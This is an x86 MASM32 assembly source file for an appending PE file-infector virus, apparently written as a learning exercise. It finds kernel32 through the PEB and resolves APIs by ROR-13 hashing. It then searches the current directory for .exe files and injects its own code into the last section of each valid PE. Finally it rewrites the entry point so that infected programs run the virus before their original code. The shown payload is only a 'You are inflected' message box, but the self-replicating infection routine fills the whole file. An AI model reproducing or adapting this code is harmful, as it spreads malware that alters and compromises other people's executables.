.386
.model flat, stdcall

option casemap:none 

; Begin ---====== for test purpose only ======---
include C:\masm32\include\windows.inc 
include C:\masm32\include\kernel32.inc
includelib C:\masm32\lib\kernel32.lib
include C:\masm32\include\masm32.inc 
includelib C:\masm32\lib\masm32.lib
include C:\masm32\include\user32.inc
includelib C:\masm32\lib\user32.lib

include c:\masm32\macros\macros.asm

; End ---====== for test purpose only ======---

.code
main:
incode segment
indep_start:

    call Delta
    Delta:
        pop ebp
        sub ebp, offset Delta
    ; Use this technique to make sure our address will correct for any program no matter it's entry point
    ; For example: the injected file will have new EntryPoint (differ with this file's EntryPoint)
    ; But the code need to be runnable correctly in that file too.
    ; so ebp now is the distance 
    ; so every address must be add more ebp
    ; Therefore esp need to be unchange throughout the code

    findkernel32:
        call find_kernel32
        mov [ebp + offset _kernel32dll], eax                ; Save base address of kernel32
  
    getAPIsFromKernel32:
        lea esi, [ebp + offset kernel32FunctionsHash]       ; First entry in list hashFunction
        lea edi, [ebp + offset kernel32FunctionsAddress]    ; First entry in list address of functions
        mov ebx, [ebp + _kernel32dll]
        call getAPIs

    findUser32:
        lea eax, [ebp + offset swUser32dll]
        push eax
        call [ebp + _LoadLibrary]
        mov [ebp + _user32dll], eax

    getAPIsFromUser32:
        lea esi, [ebp + offset user32FunctionsHash]         ; First entry in list hashFunction
        lea edi, [ebp + offset user32FunctionsAddress]      ; First entry in list address of functions
        mov ebx, [ebp + _user32dll]
        call getAPIs
    
; Begin -------======= Malicious code section perfome =======-------

    showMessageBoxA:
        push 0
        lea eax, [ebp + offset swHacked]
        push eax
        lea eax, [ebp + offset swHacked]
        push eax
        push 0
        call [ebp + _MessageBoxA]

; End -------======= Malicious code section perfome =======-------

    FindFirstFileInCurrentDirectory:
        lea eax, [ebp + offset filePathFmt]
        push eax                                            ; lpBuffer
        push 100                                            ; nBufferLength
        call [ebp + _GetCurrentDirectoryA]

        lea eax, [ebp + offset fileExtension]
        push eax 
        lea eax, [ebp + offset filePathFmt]
        push eax
        call [ebp + _lstrcatA]                              ; filePathFmt have format XXX:\*.exe

        lea eax, [ebp + offset foundData]
        push eax                                            ; lpFindFileData
        lea eax, [ebp + offset filePathFmt]
        push eax                                            ; lpFileName
        call [ebp + _FindFirstFileA]
        mov [ebp + offset hFindFile], eax
        jmp checkFile
        

    findNextFile:
        lea eax, [ebp + offset foundData]
        push eax                                            ; lpFindFileData
        mov eax, [ebp + offset hFindFile]
        push eax                                            ; hFindFile
        call [ebp + _FindNextFileA]
        test eax, eax
        je jumpToOriginalEntryPoint

    checkFile:
        mov eax, [ebp + offset hFindFile]
        cmp eax, 0FFFFFFFFh                                 ; INVALID_HANDLE_VALUE
        je errorfindFileHandle

        ; We need to check that because in case *.exe file is not a real PE file
        mov eax, [ebp + offset foundData]
        cmp eax, 10h                                        ; FILE_ATTRIBUTE_DIRECTORY
        je findNextFile

        mov eax, [ebp + offset foundData]
        cmp eax, 20h                                        ; FILE_ATTRIBUTE_ARCHIVE
        je findNextFile

    openFile:
        constructFilePath:
            lea eax, [ebp + offset filePath]
            push eax                                            ; lpBuffer
            push 100                                            ; nBufferLength
            call [ebp + _GetCurrentDirectoryA]

            lea eax, [ebp + offset slash]
            push eax
            lea eax, [ebp + offset filePath]
            push eax
            call [ebp + _lstrcatA]                              

            lea eax, [ebp + offset foundData + 44]    ; cFileName
            push eax
            lea eax, [ebp + offset filePath]
            push eax
            call [ebp + _lstrcatA]                              ; now filePath contain the full path of file

; Begin ---====== for test purpose only ======---

        push 0
        lea eax, [ebp + offset filePath]
        push eax
        lea eax, [ebp + offset filePath]
        push eax
        push 0
        call [ebp + _MessageBoxA]

; End ---====== for test purpose only ======---

        getFileHandle:
            push 0                              ; hTemplateFile
            push 20h                            ; FILE_ATTRIBUTE_NORMAL (dwFlagsAndAttributes)
            push 3h                             ; OPEN_EXISTING (dwCreationDisposition)
            push 0                              ; lpSecurityAttributes
            push 0                              ; dwShareMode
            push 0C0000000h                     ; GENERIC_READ + GENERIC_WRITE (dwDesiredAccess)
            lea eax, [ebp + offset filePath]
            push eax                            ; lpFileName
            call [ebp + _CreateFileA]

            cmp eax, 0FFFFFFFFh                 ; INVALID_HANDLE_VALUE
            je findNextFile
            mov [ebp + offset fileHandle], eax

    ; We need to check that because in case *.exe file is not a real PE file
    checkPEFile:
        ; Check first word = MZ
        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 2                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset swMZOffset]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]
        cmp [ebp + offset swMZOffset], 5A4Dh     ; MZ
        jne closeFileHandle

        ; Check PEHeader = PE
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push 3Ch                            ; Read the pointer to PEHeader (lDistanceToMove)
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset PEHeaderOffset]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]

        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push [ebp + offset PEHeaderOffset]  ; Read the pointer to PEHeader (lDistanceToMove)
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset swPEOffset]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]

        cmp [ebp + offset swPEOffset], 00004550h     ; PE00
        jne closeFileHandle

    getOriginalEntryPoint:
        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 28h                        ; Entry point
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset originalEntryPoint]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]


    getNumberOfSection:
        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 6h                         ; Number Of Section
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 2                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset numberOfSection]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]

    getSizeOfImage:
        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 50h                        ; SizeOfImage
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset sizeOfImage]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]

    getImageBase_SectionAlignment_FileAlignment:
    ; Because there 3 option are consecutive in PE header so we can get them by get 12 consecutive bytes
    ; Our data of these 3 option must be also consecutive
    ; In this code I do not use FileAlignment & SectionAlignment so it's useless in this code
    ; Because I inject code the the last section. If I create new section, I will need SectionAlignment & FileAlignment
        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 34h                        ; Image Base -> SectionAlignment -> FileAlignment
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 12                              ; nNumberOfBytesToRead
        lea eax, [ebp + offset imageBase]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]

    getLastSetion:
        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 248                        ; start Address of first Section
        mov ecx, [ebp + offset numberOfSection]
        dec ecx
        xor eax, eax
        mul_eax:
            add eax, 40
            loop mul_eax
        add ebx, eax

    getPropertiesOfLastSection:
        add ebx, 8                          ; Point to virtual size of section
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesRead
        push 16                             ; nNumberOfBytesToRead
        lea eax, [ebp + offset lastSectionVirtualSize]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _ReadFile]     

    ; if The last section contain the original entry point so I assum that file already injected
    testIfThisFileIsInjected:
        mov eax, [ebp + originalEntryPoint]
        cmp eax, [ebp + lastSectionVirtualAddress]
        jae closeFileHandle

    calVirusSize:
        mov eax, offset indep_end
        sub eax, offset indep_start
        mov [ebp + offset sizeOfVirus], eax

    writeNewPropertiesToFile:
        mov eax, [ebp + offset sizeOfVirus]
        add [ebp + offset sizeOfImage], eax
        add [ebp + lastSectionRawSize], eax
        mov eax, [ebp + lastSectionRawSize]
        mov [ebp + lastSectionVirtualSize], eax

        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; Point to virtual size of section (lDistanceToMove)
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesWritten
        push 16                             ; nNumberOfBytesToWrite
        lea eax, [ebp + offset lastSectionVirtualSize]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _WriteFile]   

        add ebx, 28                         ; Point to Characteristics of section
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; Point to Characteristics of section (lDistanceToMove)
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]
        
        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesWritten
        push 16                             ; nNumberOfBytesToWrite
        lea eax, [ebp + offset lastSectionCharacteristics]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _WriteFile] 

        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 50h                        ; SizeOfImage
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesWritten
        push 4                              ; nNumberOfBytesToWrite
        lea eax, [ebp + offset sizeOfImage]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _WriteFile]   

    CalNewEntryPoint:
        mov eax, [ebp + lastSectionRawAddress]
        add eax, [ebp + lastSectionRawSize]
        sub eax, [ebp + sizeOfVirus]
        sub eax, [ebp + lastSectionRawAddress]
        add eax, [ebp + lastSectionVirtualAddress]
        mov [ebp + newEntryPoint], eax

    ReWriteEntryPoint:
        mov ebx, [ebp + offset PEHeaderOffset]
        add ebx, 28h                        ; Entry point
        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesWritten
        push 4                              ; nNumberOfBytesToWrite
        lea eax, [ebp + offset newEntryPoint]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _WriteFile]   

    InjectToLastSection:
        mov ebx, [ebp + lastSectionRawAddress]
        add ebx, [ebp + lastSectionRawSize]
        sub ebx, [ebp + sizeOfVirus]

        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesWritten
        push [ebp + offset sizeOfVirus]     ; nNumberOfBytesToWrite
        lea eax, [ebp + offset indep_start]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _WriteFile] 

    ChangeJumpOriginalEntryPointSection_InteadOfJumpToExitProcess:
        mov eax, offset jumpToOriginalEntryPoint    ; we want to fix this value because it's the offset of that label in the code
        sub eax, offset indep_start
        add eax, 2                                  ; op-code of 'lea' is 2 byte
        add ebx, eax

        push 0                              ; FILE_BEGIN (dwMoveMethod)
        push 0                              ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _SetFilePointer]

        mov eax, [ebp + offset originalEntryPoint]
        add eax, [ebp + offset imageBase]
        mov [ebp + offset originalEntryPoint], eax
        push 0                              ; lpOverlapped
        lea eax, [ebp + offset BytesRead]
        push eax                            ; lpNumberOfBytesWritten
        push 4                              ; nNumberOfBytesToWrite
        lea eax, [ebp + offset originalEntryPoint]
        push eax                            ; lpBuffer
        push [ebp + offset fileHandle]      ; hFile
        call [ebp + _WriteFile] 

    jmp closeFileHandle
    
    errorfindFileHandle:
        push 0
        lea eax, [ebp + offset swErrorHandleFindFile]
        push eax
        lea eax, [ebp + offset swErrorHandleFindFile]
        push eax
        push 0
        call _MessageBoxA
        jmp jumpToOriginalEntryPoint

    closeFileHandle:
        push [ebp + offset fileHandle]
        call [ebp + _CloseHandle]
        jmp findNextFile

    jumpToOriginalEntryPoint:
        ; Because it's the virus file and it doesn't have original entry point so we point to exitProcess
        lea eax, offset exitProcess
        jmp eax
        
    exitProcess:
        push 0
        call [ebp + _ExitProcess]


;--------================ Other Functions

    ; Use PEB technique to get address of Kernal32.dll
    ; @return: base address of kernel32
    find_kernel32:
        ASSUME FS:NOTHING
        mov   eax, fs:[30h]                     ; address of PEB
        mov   eax, [eax + 0ch]                  ; Extract the pointer to the loader data structure.
        mov   esi, [eax + 1ch]                  ; Extract the first entry in the initialization order module list.
        lodsd                                   ; kernel32.dll is at 3rd entry.
        mov esi, eax
        lodsd                                   ; now eax contain address of kernel32.dll
        mov   eax, [eax + 8h]                   ; Grab the module base address and store it in eax
        ret

    ; ebx   (address of library)
    ; return: void
    getAPIs:
        mov eax, [esi]
        cmp eax, 0BBh                               ; until the end of the list
        je endgetAPIs
        push [esi]                                  ; hash of function
        push ebx                                    ; base address library
        call find_function
        mov [edi], eax                              ; save address functions

        add edi, 4
        add esi, 4
        jmp getAPIs
        endgetAPIs:
        ret
    
    ; [esp + 0x24] (library base address)
    ; [esp + 0x28] (function hash)
    ; @return: address of function
    find_function:
        pushad                                  ; Save all registers
        mov ebp, [esp + 24h]                    ; Take the base address of kernel32 and put it in ebp
        mov eax, [ebp + 3ch]                    ; Skip over the MSDOS header to the start of the PE header.
        mov edx, [ebp + eax + 78h]              ; The export table is 0x78 bytes from the start of the PE header. Extract it and start the relative address in edx.
        add edx, ebp                            ; Make the export table address absolute by adding the base address to it.
        mov ecx, [edx + 18h]                    ; Extract the number of exported items and store it in ecx which will be used as the counter
        mov ebx, [edx + 20h]                    ; Extract the names table relative offset and store it in ebx.
        add ebx, ebp                            ; Make the names table address absolute by adding the base address to it.
    find_function_loop:
        jecxz find_function_finished            ; If ecx is zero then the last symbol has been checked and as such jump to the end of the function.
                                                ; If this condition is ever true then the requested symbol was not resolved properly.
        dec ecx
        mov esi,[ebx+ecx*4]                     ; Extract the relative offset of the name associated with the current symbol and store it in esi
        add esi, ebp                            ; Make the address of the symbol name absolute by adding the base address to it.
    compute_hash:
        xor edi, edi
        xor eax, eax
        cld                                     ; Clear the direction flag
    compute_hash_again:
        lodsb                                   ; Load the byte at esi, the current symbol name, into al and increment esi.
        test  al, al                            ; Bitwise test al with itself to see if the end of the string has been reached.
        jz    compute_hash_finished
        ror   edi, 0dh                          ; Rotate the current value of the hash 13 bits to the right.
        add   edi, eax                          ; Add the current character of the symbol name to the hash accumulator.
        jmp   compute_hash_again
    compute_hash_finished:
    find_function_compare:
        cmp   edi, [esp + 28h]
        jnz   find_function_loop
        mov   ebx, [edx + 24h]                  ; Extract the ordinals table relative offset and store it in ebx.
        add   ebx, ebp                          ; Make the ordinals table address absolute by adding the base address to it.
        mov cx,[ebx+2*ecx]                      ; Extract the current symbols ordinal number from the ordinal table.
        mov ebx, [edx + 1ch]                    ; Extract the address table relative offset and store it in ebx.
        add ebx, ebp                            ; Make the address table address absolute by adding the base address to it.
        mov eax,[ebx+4*ecx]                     ; Extract the relative function offset from its ordinal and store it in eax.
        add eax, ebp                            ; Make the function’s address absolute by adding the base address to it.
        mov   [esp + 1ch], eax                  ; Overwrite the stack copy of the preserved eax register so that when popad is finished the appropriate return value will be set.
    find_function_finished:
        popad 
        ret 8

;---================== Data will be located at the end

    swErrorHandleFindFile       db      'Error when find file', 0Ah, 0

    swHacked                db      "You are inflected",0

    swUser32dll             db      "user32.dll",0
    swMessageBoxA           db      "MessageBoxA",0

    _kernel32dll            dd      ?
    _user32dll              dd      ?

user32FunctionsAddress:
    _MessageBoxA            dd      00000000h

user32FunctionsHash:
    @MessageBoxA            dd      0bc4da2a8h
                            dd      0BBh                ; end of list


kernel32FunctionsAddress:
    _GetProcAddress         dd      00000000h
    _LoadLibrary            dd      00000000h
    _ExitProcess            dd      00000000h
    _CloseHandle            dd      00000000h
    _CreateFileA            dd      00000000h
    _FindClose              dd      00000000h
    _FindFirstFileA         dd      00000000h
    _FindNextFileA          dd      00000000h
    _GetCurrentDirectoryA   dd      00000000h
    _ReadFile               dd      00000000h
    _SetFilePointer         dd      00000000h
    _WriteFile              dd      00000000h
    _lstrcatA               dd      00000000h
    _VirtualProtect         dd      00000000h

kernel32FunctionsHash:
    @GetProcAddress         dd      7c0dfcaah
    @LoadLibrary            dd      0ec0e4e8eh
    @ExitProcess            dd      73e2d87eh
    @CloseHandle            dd      0ffd97fbh
    @CreateFileA            dd      7c0017a5h
    @FindClose              dd      23545978h
    @FindFirstFileA         dd      63d6c065h
    @FindNextFileA          dd      0a5e1ac97h
    @GetCurrentDirectoryA   dd      0bfc6eb4fh
    @ReadFile               dd      10fa6516h
    @SetFilePointer         dd      76da08ach
    @WriteFile              dd      0e80a791fh
    @lstrcatA               dd      0cb73463bh
                            dd      0BBh                    ; end of list

    lpBuffer                dd      0

    fileExtension           db      "\*.exe",0
    slash                   db      '\', 0
    hFindFile	            dd      ?                       ; Handle of find First File and File next file
    filePathFmt             db      200 dup(?)              ; Format string of file Path
    filePath                db      200 dup(?)
    foundData				db 		592 dup (?) ,0

    fileHandle              dd      ?
    BytesRead               dd      ?

    swPEOffset                dd      ?                     ; save the word in the PEHeaderOffset to test if it == PE
    swMZOffset                dd      ?                     ; save the begining of file to test if it == MZ
    PEHeaderOffset          dd      ?                       ; Offset of begining of PE Header
    originalEntryPoint      dd      ?                       ; File's original entry point
    newEntryPoint           dd      ?                       ; Entry point of dirty code
    imageBase               dd      ?                       ; usually 40000
    SectionAlignment               dd      ?                      
    FileAlignment               dd      ?                       
    numberOfSection         dd      ?
    sizeOfImage             dd      ?

    lastSectionVirtualSize  dd      ?
    lastSectionVirtualAddress   dd      ?
    lastSectionRawSize      dd      ?
    lastSectionRawAddress   dd      ?
    lastSectionCharacteristics  dd      0E89BFEFFh

    sizeOfVirus             dd      ?

indep_end:
incode ends

end main